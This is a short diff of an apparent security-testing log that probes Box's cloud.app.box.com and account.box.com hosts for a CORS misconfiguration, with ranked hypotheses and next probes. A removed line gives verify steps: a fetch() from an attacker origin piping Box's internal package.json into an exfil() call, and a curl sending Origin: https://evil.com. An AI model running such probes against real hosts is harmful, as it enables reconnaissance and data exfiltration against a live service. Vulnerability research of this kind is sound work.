@@ -37,7 +37,6 @@
   "status": "IN_PROGRESS",
   "last_advance": "2026-08-16 23:36:00 UTC"
 }=== MY LAST LEADS (tail) ===
-verify_steps: 1. From attacker origin, `fetch('https://cloud.app.box.com/_assets/package.json').then(r=>r.text()).then(t=>exfil(t))` — should return full JSON with internal Git host. 2. `curl -s -I -H "Origin: https://evil.com" https://cloud.app.box.com/_assets/robots.txt` — confirms `access-control-allow-origin: *,*`.
 impact: Any website can silently read Box's internal build configuration, Git server hostname, repository paths, and server filesystem layout. Severity: Low-Medium (info disclosure, no direct data access, but aids reconnaissance for targeted attacks against internal infrastructure).
 testability: PASSIVE
 class: MISCONFIG
@@ -97,6 +96,7 @@ impact: If root reflects Origin or leaks Authorization header, severity jumps to
 testability: PASSIVE
 [NEXT] PROBE: CORS divergence root vs _assets + _assets sibling enumeration
 ## 2026-08-16 23:51:19 UTC account.box.com (ling3)
+## 2026-08-17 00:00:36 UTC account.box.com (ling3)
 === RANKED HYPOTHESES (tail) ===
 - [40] cloud.app.box.com/: upload.box.com responder fingerprint via robots.txt: whether the upload gateway answers the status channel for any non-API path, using robots.txt as the highest-yield key (from host-upload.box.com.md)
 
